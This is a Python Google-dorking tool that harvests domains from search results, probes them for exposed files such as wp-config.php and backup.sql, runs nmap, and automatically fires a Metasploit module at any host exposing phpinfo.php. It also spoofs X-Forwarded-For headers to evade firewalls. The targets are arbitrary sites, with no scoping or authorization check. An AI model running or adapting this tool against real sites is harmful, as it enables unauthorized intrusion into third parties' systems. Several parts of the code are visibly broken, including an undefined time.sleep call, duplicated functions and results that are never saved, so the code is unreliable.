# -*- coding: utf-8 -*-
import argparse
import time as t   
import json
import sqlite3
import csv
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from googlesearch import search
from urllib.parse import urlparse
import requests
import random
import re
from colorama import Fore, Style, init
from datetime import datetime
import os
import subprocess
from bs4 import BeautifulSoup
import http.client
import hashlib
import requests
import httpx
import signal 
import platform
import sys
# Renk ve reset için colorama'yı başlat
init(autoreset=True) 

# Define color codes
RESET = "\033[0m"
CYAN = "\033[36m"
MAGENTA = "\033[35m"
BLUE = "\033[34m"
LIGHT_BLUE = "\033[94m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
WHITE = "\033[37m"
PURPLE = "\033[35m"
RED = "\033[31m"

# Define a custom emoji message
emoji_message = "\U0001F496" + " ❤️  Öykü'me Özel Bir Hediye  ❤️ " + "\U0001F496"

# Create a futuristic-looking banner with enhanced design
banner =f"""
{CYAN}  
=============================================================================
{MAGENTA}                   {emoji_message}
                   {RED}💖 Kalbimde Sonsuza Dek Olacaksın, Öykü'm 💖
{LIGHT_BLUE}       — You will forever remain in my heart
                {YELLOW}✨ With Infinite Love ✨ {RESET}
===============================================================================
 


  (_)/ /   ____ ___ _ / /   (_)__ _   ___ ___ _ / /
 / // _ \ / __// _ `// _ \ / //  ' \ (_-</ _ `// /
/_//_.__//_/   \_,_//_//_//_//_/_/_//___/\_, //_/
                                          /_/
  ___ ____  ___  ___ _/ /__ ___/ /__  ____/ /__ (_)__  ___ ____/ /____  ___  / /
 / _ `/ _ \/ _ \/ _ `/ / -_) _  / _ \/ __/  '_// / _ \/ _ `(_-< __/ _ \/ _ \/ /
 \_, /\___/\___/\_, /_/\__/\_,_/\___/_/ /_/\_\/_/_//_/\_, /___|__/\___/\___/_/
/___/          /___/                                 /___/

{RESET}
"""

# Print banner on execution
print(banner)
 

# Argument Parsing with all possible options
parser = argparse.ArgumentParser(description="🚀 Ultimate Ultra-God VIP Google Dork Search Tool with Extended Vulnerability Detection 🚀")
parser.add_argument("-q", "--query", type=str, nargs='+', required=True, help="Google Dork query or queries (multiple allowed)")
parser.add_argument("-n", "--number", type=int, default=10, help="Max number of sites to fetch")
parser.add_argument("-o", "--output", type=str, default="google_dork_results", help="Output file name (without extension)")
parser.add_argument("-t", "--tld", type=str, default="com", help="Domain extension (e.g., com, org, net)")
parser.add_argument("--remove-www", action="store_true", help="Remove www prefix")
parser.add_argument("--min-delay", type=float, default=1.0, help="Minimum wait time (seconds)")
parser.add_argument("--max-delay", type=float, default=3.0, help="Maximum wait time (seconds)")
parser.add_argument("--output-format", choices=["txt", "json", "csv", "db"], default="txt", help="Output format: txt, json, csv, or db")
parser.add_argument("--proxy", type=str, nargs='+', help="Proxy addresses (e.g., http://proxy1, http://proxy2)")
parser.add_argument("--check-cloudflare", action="store_true", help="Check for and skip Cloudflare protection")
parser.add_argument("--threads", type=int, default=5, help="Max number of threads")
parser.add_argument("--proxy-rotator", action="store_true", help="Use a different proxy for each request")
parser.add_argument("--captcha-bypass", action="store_true", help="Attempt to bypass CAPTCHA challenges")
parser.add_argument("--scheduler", type=str, help="Schedule scan to start at a specific time (e.g., '23:00')")
parser.add_argument("--max-results", type=int, default=100, help="Limit the max number of results")
parser.add_argument("--vulnerability-report", action="store_true", help="Automatically generate vulnerability reports")
parser.add_argument("--web-scraping-api", action="store_true", help="Integrate with a web scraping API")
parser.add_argument("--lang", type=str, default="en", help="Search language filter")
parser.add_argument("--geo-target", type=str, help="Specify a geographic target for search")
parser.add_argument("--dns-tunneling", action="store_true", help="Bypass restrictions using DNS Tunneling")
parser.add_argument("--ssl-check", action="store_true", help="Perform SSL/TLS vulnerability checks")
parser.add_argument("--dork-type", type=str, choices=["filetype", "inurl", "intitle"], help="Specify dork type")
parser.add_argument("--category", type=str, help="Choose a dork category")
parser.add_argument("--cookie", type=str, help="Specify a custom cookie for search")
parser.add_argument("--agent", type=str, help="Use a custom User-Agent")
parser.add_argument("--list", action="store_true", help="Perform batch search with predefined dork lists")
parser.add_argument("--no-sandbox", action="store_true", help="Disable sandbox features")
parser.add_argument("--save", action="store_true", help="Save results to file")
parser.add_argument("-f", "--file", type=str, help="Perform batch search using a dork list file")
parser.add_argument("--timeout", type=int, default=5, help="Set request timeout in seconds")
parser.add_argument("--domain", type=str, help="Focus search on a specific domain")
parser.add_argument("--num-results", type=int, default=10, help="Limit the number of returned results")
parser.add_argument("--waf-bypass", action="store_true", help="Attempt to bypass Web Application Firewall")
parser.add_argument("--exploit-db", action="store_true", help="Search for vulnerabilities with Exploit-DB integration")
args = parser.parse_args()

# Program başında işletim sistemi bilgisini göster
print(f"{GREEN}[INFO] Program çalışıyor... Platform: {platform.system()}{RESET}")

# Ctrl+C İle Durdurulma Mesajı (Programın her yerinde çalışır)
def signal_handler(sig, frame):
    print(f"{RED}\n[STOP] Program Ctrl+C ile durduruldu.{RESET}")
    sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

def get_random_proxy():
    if args.proxy:
        proxy = random.choice(args.proxy)
        logging.info(Fore.GREEN + f"[PROXY] Kullanılan Proxy: {proxy}")
        return {"http": proxy, "https": proxy}
    return None

# Git version check
def version_check():
    version = "v3.1.4"
    url = "https://github.com/ibrahimsql/pyrecon/releases/tag/3.1.4"
    
    try:
        # API isteği gönderme
        logging.info(f"Version check started for {url}")
        response = requests.get(url)
        
        # Yanıtın durum kodunu kontrol etme
        if response.status_code == 200:
            logging.info(f"Received successful response: {response.status_code}")
            data = response.json()
            latest = data.get('tag_name')

            # Versiyon karşılaştırması
            if latest == version:
                logging.info(f"Current version {version} is up-to-date")
                print(f"[Version]: ibrahimsqldorkingtool current version {version} (latest)")
                t.sleep(1)
            else:
                logging.warning(f"Current version {version} is outdated. Latest version: {latest}")
                print(f"[Version]: ibrahimsqldorkingtool current version {version} (outdated)")
                t.sleep(1)
                print(f"[INFO]: Please Install the new version through pip command: pip install --upgrade ibrahimsql")
                t.sleep(1)
                print(f"[INFO]: After updating through pip, visit here: https://github.com/İBRAHİMSQL to know the information of the latest update")
                t.sleep(1)
        else:
            logging.error(f"Failed to fetch release info. Status code: {response.status_code}")
            print(f"[ERROR]: Unable to fetch the latest release information. Status code: {response.status_code}")

    except requests.exceptions.RequestException as req_err:
        logging.error(f"Request exception occurred: {req_err}")
        print(f"[ERROR]: Request exception: {req_err}")

    except Exception as e:
        logging.error(f"Unexpected error occurred: {e}")
        print(f"[ERROR]: {e}")

    finally:
        logging.info("Version check process completed.")
        print("[INFO]: Version check completed.")

# Fonksiyonu çağırarak işlemi başlatma
version_check()

# Logging configuration
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logging.getLogger("requests").setLevel(logging.WARNING)

# DDOS & Cloudflare protection phrases
ddos_warning_phrases = [
    "Access from your IP has been blocked due to a DDoS attack.",

    "Please try again later.",

    "If you feel this is an error please contact us.",

    "IP adresinden doğru DDoS atak tespit edilmiş ve engellenmiştir.",

    "Lütfen daha sonra tekrar deneyiniz.",

    "Bunun bir hata olduğunu düşünüyorsanız bizimle iletişime geçebilirsiniz.",

    "DDoS protection by Cloudflare",

    "Attention Required! | Cloudflare",

    "This website is using a security service to protect itself from online attacks",

    "Access denied | Cloudflare"]

# Vulnerable paths for scanning
vulnerable_paths = ["/phpinfo.php", "/admin.php", "/backup.sql", "/test.php", "/login.php", "/config.php", "/wp-config.php"]

# Proxy & User-Agent Handling
def get_random_proxy():
    if args.proxy:
        proxy = random.choice(args.proxy)
        logging.info(Fore.GREEN + f"[PROXY] Using Proxy: {proxy}")
        return {"http": proxy, "https": proxy}
    return None

def get_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/86.0.4240.111 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/86.0.4240.111 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15) AppleWebKit/605.1.15 Version/13.0 Safari/605.1.15",
        "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
    ]
    return args.agent if args.agent else random.choice(user_agents)

# Initialize Database securely
def init_db(database):
    conn = sqlite3.connect(database)
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS results (domain TEXT, source_url TEXT, status_code INTEGER, vulnerable_paths TEXT)")
    return conn, cursor

# Nmap scan for domain ports and services
def nmap_scan(domain):
    output_file = f"{args.output}_{domain}_nmap.txt"
    command = ["nmap", "-p-", domain, "-oN", output_file]
    logging.info(Fore.BLUE + f"[NMAP] Starting Nmap scan for {domain}...")

    try:
        subprocess.run(command, check=True)
        logging.info(Fore.GREEN + f"[NMAP] Scan complete. Output saved to {output_file}")
        return output_file
    except subprocess.CalledProcessError as e:
        logging.error(Fore.RED + f"[NMAP ERROR] Failed scan: {e}")
        return None

# Main DorkScanner Class with Error Tolerance
class DorkScanner:
    def __init__(self):
        self.results = []
        self.conn, self.cursor = init_db(f"{args.output}.db") if args.output_format == "db" else (None, None)

    def check_for_ddos_protection(self, url):
        headers = {"User-Agent": get_random_user_agent()}
        proxies = get_random_proxy()
        try:
            response = requests.get(url, headers=headers, proxies=proxies, timeout=args.timeout)
            for phrase in ddos_warning_phrases:
                if re.search(phrase, response.text, re.IGNORECASE):
                    return True, response.status_code
            return False, response.status_code
        except requests.RequestException as e:
            logging.error(f"[ERROR] Could not access {url}. Error: {e}")
            return True, None

    def scan_vulnerable_paths(self, domain):
        headers = {"User-Agent": get_random_user_agent()}
        proxies = get_random_proxy()
        found_paths = []

        for path in vulnerable_paths:
            url = f"http://{domain}{path}"
            try:
                response = requests.get(url, headers=headers, proxies=proxies, timeout=5)
                if response.status_code == 200:
                    logging.info(Fore.RED + f"[VULNERABLE] Found accessible path: {url}")
                    found_paths.append({"path": url, "status_code": response.status_code})
            except requests.RequestException:
                continue
        return found_paths

    def metasploit_exploit(self, domain):
        logging.info(Fore.CYAN + f"[INFO] Running Metasploit on {domain} for identified vulnerable paths.")
        os.system(f"msfconsole -x 'use exploit/multi/http/php_info_leak; set RHOST {domain}; run; exit'")

    def process_result(self, result):
        domain = urlparse(result).netloc
        if args.remove_www:
            domain = domain.replace("www.", "")

        # Domain TLD check
        if domain.endswith(f".{args.tld}"):  
            # WAF Bypass attempt
            if args.waf_bypass:
                logging.info(Fore.YELLOW + f"[WAF BYPASS] Attempting WAF bypass: {domain}")
                headers = {
                    "User-Agent": get_random_user_agent(),
                    "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                }
            else:
                headers = {"User-Agent": get_random_user_agent()}

            # Cloudflare Check
            if args.check_cloudflare:
                is_protected, status_code = self.check_for_ddos_protection(result)
                if is_protected:
                    logging.info(Fore.YELLOW + f"[SKIP] Cloudflare protection detected, skipping: {domain}")
                    return None

            # Vulnerability Scan & Nmap Check
            vulnerable_paths = self.scan_vulnerable_paths(domain)
            nmap_output = nmap_scan(domain) if args.ssl_check else None

            if args.exploit_db:
                logging.info(Fore.CYAN + f"[EXPLOIT-DB] Checking Exploit-DB for: {domain}")
                self.exploit_db_search(domain)

            if any("/phpinfo.php" in entry['path'] for entry in vulnerable_paths):
                self.metasploit_exploit(domain)

            result_data = {
                "domain": domain,
                "source_url": result,
                "status_code": status_code,
                "vulnerable_paths": vulnerable_paths,
                "nmap_output": nmap_output
            }
            self.results.append(result_data)

            if self.cursor:
                self.cursor.execute(
                    "INSERT INTO results (domain, source_url, status_code, vulnerable_paths) VALUES (?, ?, ?, ?)",
                    (domain, result, status_code, json.dumps(vulnerable_paths))
                )

            return result_data
    
    def exploit_db_search(self, domain):
        logging.info(Fore.BLUE + f"[EXPLOIT-DB] Searching Exploit-DB for {domain} vulnerabilities...")
        # Integrate Exploit-DB API or custom search functionality.

    def save_results(self):
        if args.output_format == "json":
            with open(f"{args.output}.json", "w") as f:
                json.dump(self.results, f, indent=4)
        elif args.output_format == "csv":
            with open(f"{args.output}.csv", "w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(["domain", "source_url", "status_code", "vulnerable_paths"])
                for entry in self.results:
                    writer.writerow([entry["domain"], entry["source_url"], entry["status_code"], json.dumps(entry["vulnerable_paths"])])
        elif args.output_format == "db" and self.conn:
            self.conn.commit()
            self.conn.close()
        else:
            with open(f"{args.output}.txt", "w") as f:
                for entry in self.results:
                    f.write(f"{entry['domain']} - {entry['source_url']} - Status Code: {entry['status_code']} - Vulnerable Paths: {json.dumps(entry['vulnerable_paths'])}\n")

    def google_dork_search(self, dork):
        logging.info(Fore.CYAN + f"[SEARCH] Starting Google Dork search for '{dork}'")
        found_results = False

        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = [executor.submit(self.process_result, result) for result in search(dork, num_results=args.num_results)]
            for future in as_completed(futures):
                try:
                    data = future.result()
                    if data:
                        self.results.append(data)
                        if not found_results:
                            logging.info(Fore.GREEN + f"[FOUND] Results found for '{dork}'!")
                            found_results = True
                    time.sleep(random.uniform(args.min_delay, args.max_delay))
                except Exception as e:
                    logging.error(Fore.RED + f"[ERROR] Error processing result: {e}")
# Scheduler for Automated Scans
def schedule_scan(scanner):
    if args.scheduler:
        schedule_time = datetime.strptime(args.scheduler, "%H:%M").time()
        while True:
            current_time = datetime.now().time()
            if current_time >= schedule_time:
                logging.info(Fore.GREEN + "[SCHEDULER] Starting scheduled scan...")
                for dork in args.query:
                    scanner.google_dork_search(dork)
                break
            t.sleep(30)
# Fonksiyonları çağırma
def some_function():
    
    try:
        logging.info(Fore.YELLOW + "[INFO] Waiting for 30 seconds...")
        t.sleep(30)  # 30 saniye bekler
        logging.info(Fore.GREEN + "[INFO] Waiting time complete!")
    except Exception as e:
        logging.error(Fore.RED + f"[ERROR] Error during sleep: {str(e)}")


some_function()

# Main Function
def jls_extract_def():
    if args.scheduler:
        schedule_scan(DorkScanner())
    else:
        # Loop through Dork queries
        for dork in args.query:
            logging.info(Fore.CYAN + f"[INFO] Searching for '{dork}'...")
            (DorkScanner()).google_dork_search(dork)
    return dork


def main():
    

    # Scheduling check
    
    dork = jls_extract_def()

    # Save Results
    if args.save:
        (DorkScanner()).save_results()
    logging.info(Fore.MAGENTA + f"[INFO] Results saved to '{args.output}.{args.output_format}'.")

if __name__ == "__main__":
    main() 
